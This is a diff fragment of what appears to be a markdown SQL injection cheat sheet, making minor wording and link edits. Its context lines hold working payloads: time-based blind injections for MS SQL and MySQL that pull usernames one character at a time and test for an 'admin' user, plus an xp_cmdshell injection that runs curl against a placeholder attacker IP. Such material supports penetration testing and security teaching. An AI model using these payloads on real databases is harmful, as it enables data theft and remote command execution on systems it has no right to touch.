@@ -29,7 +29,7 @@ Use the waiting time to determine whether the conditional equation is valid
 '; IF (ASCII(lower(substring((select TOP 1 username from users), 1, 1))) > 97) WAITFOR DELAY '00:00:05' --
 '; IF (ASCII(lower(substring((select TOP 1 username from users), 1, 1))) > 98) WAITFOR DELAY '00:00:05' -- and so on
 
--- e.g. confirm username is correct
+-- e.g. confirm that the username is correct
 '; IF (substring((select TOP 1 username from users), 1, 5) = 'admin') WAITFOR DELAY '00:00:05'--
 ```
 
@@ -52,7 +52,7 @@ SLEEP(IF((SELECT COUNT(*) FROM information_schema.schemata
 WHERE schema_name NOT IN ('information_schema', 'mysql', 'performance_schema'))='1', 5, 0)); 
 ```
 
-MS SQL xp_cmdshell testing
+[MS SQL xp_cmdshell command testing](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16)
 
 ```SQL
 '; EXEC xp_cmdshell 'curl http://<attacker ip>'; --
